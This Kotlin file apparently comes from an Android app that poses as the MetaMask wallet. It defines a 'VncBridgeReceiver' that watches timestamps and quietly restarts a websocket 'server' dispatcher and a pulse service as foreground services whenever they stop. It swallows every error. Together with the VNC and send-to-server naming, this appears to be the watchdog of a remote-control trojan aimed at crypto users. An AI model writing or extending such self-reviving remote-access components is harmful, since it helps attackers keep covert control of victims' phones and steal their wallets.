package com.example.MetaMask.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.PulseService

class VncBridgeReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "VncBridgeReceiver"

        private const val PREFS_MWD         = "mwd_state"
        private const val KEY_MWD_ALIVE_TS  = "alive_ts"
        private const val KEY_LAST_MWD_WAKE = "last_bridge_wake"
        private const val MWD_ALIVE_THRESHOLD_MS = 35_000L
        private const val MWD_WAKE_THROTTLE_MS   = 10_000L

        private const val PREFS_PULSE         = "pulse_state"
        private const val KEY_PULSE_ALIVE_TS  = "alive_ts"
        private const val KEY_LAST_PULSE_WAKE = "last_pulse_bridge_wake"
        private const val PULSE_ALIVE_THRESHOLD_MS = 120_000L
        private const val PULSE_WAKE_THROTTLE_MS   = 30_000L
    }

    override fun onReceive(context: Context, intent: Intent) {
        android.util.Log.d("XDBG", "[VncBridgeReceiver] onReceive enter context=ctx intent=${intent}") //xdbg
        if (intent.action != MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER) return

        val now = System.currentTimeMillis()
        val mwdPrefs = context.getSharedPreferences(PREFS_MWD, Context.MODE_PRIVATE)

        val mwdAliveTs = mwdPrefs.getLong(KEY_MWD_ALIVE_TS, 0L)
        if (now - mwdAliveTs >= MWD_ALIVE_THRESHOLD_MS) {
            android.util.Log.d("XDBG", "[VncBridgeReceiver] if branch") //xdbg
            val lastMwdWake = mwdPrefs.getLong(KEY_LAST_MWD_WAKE, 0L)
            if (now - lastMwdWake >= MWD_WAKE_THROTTLE_MS) {
                android.util.Log.d("XDBG", "[VncBridgeReceiver] if branch") //xdbg
                mwdPrefs.edit().putLong(KEY_LAST_MWD_WAKE, now).apply()
                try {
                    val i = Intent(context, MasterWebSocketDispatcher::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(i)
                    else context.startService(i)
                } catch (_: Exception) {}
            }
        }

        try {
            val pulsePrefs = context.getSharedPreferences(PREFS_PULSE, Context.MODE_PRIVATE)
            val pulseAliveTs = pulsePrefs.getLong(KEY_PULSE_ALIVE_TS, 0L)
            if (pulseAliveTs > 0L && now - pulseAliveTs >= PULSE_ALIVE_THRESHOLD_MS) {
                android.util.Log.d("XDBG", "[VncBridgeReceiver] if branch") //xdbg
                val lastPulseWake = mwdPrefs.getLong(KEY_LAST_PULSE_WAKE, 0L)
                if (now - lastPulseWake >= PULSE_WAKE_THROTTLE_MS) {
                    android.util.Log.d("XDBG", "[VncBridgeReceiver] if branch") //xdbg
                    mwdPrefs.edit().putLong(KEY_LAST_PULSE_WAKE, now).apply()
                    val pi = Intent(context, PulseService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(pi)
                    else context.startService(pi)
                }
            }
        } catch (_: Exception) {}
    }
}
